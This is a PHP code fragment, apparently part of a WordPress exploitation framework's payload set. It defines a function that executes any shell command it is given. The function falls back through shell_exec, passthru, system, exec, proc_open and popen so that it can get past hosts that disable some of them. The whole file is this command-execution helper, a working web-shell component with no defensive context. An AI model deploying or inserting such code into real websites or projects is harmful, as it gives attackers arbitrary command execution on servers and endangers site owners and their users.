<?php
  $wpxf_exec = function ($wpxf_cmd) {
    global $wpxf_disabled;
    if (is_callable('shell_exec') && !in_array('shell_exec', $wpxf_disabled)) {
      $wpxf_output = shell_exec($wpxf_cmd);
    }
    else if (is_callable('passthru') && !in_array('passthru', $wpxf_disabled)) {
      ob_start();
      passthru($wpxf_cmd);
      $wpxf_output = ob_get_contents();
      ob_end_clean();
    }
    else if (is_callable('system') && !in_array('system', $wpxf_disabled)) {
      ob_start();
      system($wpxf_cmd);
      $wpxf_output = ob_get_contents();
      ob_end_clean();
    }
    else if (is_callable('exec') && !in_array('exec', $wpxf_disabled)) {
      $wpxf_output = array();
      exec($wpxf_cmd, $wpxf_output);
      $wpxf_output = join(chr(10), $wpxf_output).chr(10);
    }
    else if (is_callable('proc_open') && !in_array('proc_open', $wpxf_disabled)) {
      $wpxf_handle = proc_open($wpxf_cmd, array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$wpxf_pipes);
      $wpxf_output = NULL;
      while (!feof($wpxf_pipes[1])) {
        $wpxf_output .= fread($wpxf_pipes[1],1024);
      }
      @proc_close($wpxf_handle);
    }
    else if (is_callable('popen') && !in_array('popen', $wpxf_disabled)) {
      $wpxf_fp = popen($wpxf_cmd,'r');
      $wpxf_output = NULL;
      if (is_resource($wpxf_fp)) {
        while (!feof($wpxf_fp)) {
          $wpxf_output.=fread($wpxf_fp,1024);
        }
      }
      @pclose($wpxf_fp);
    }
    else {
      $wpxf_output = 0;
    }
    return $wpxf_output;
  };
?>
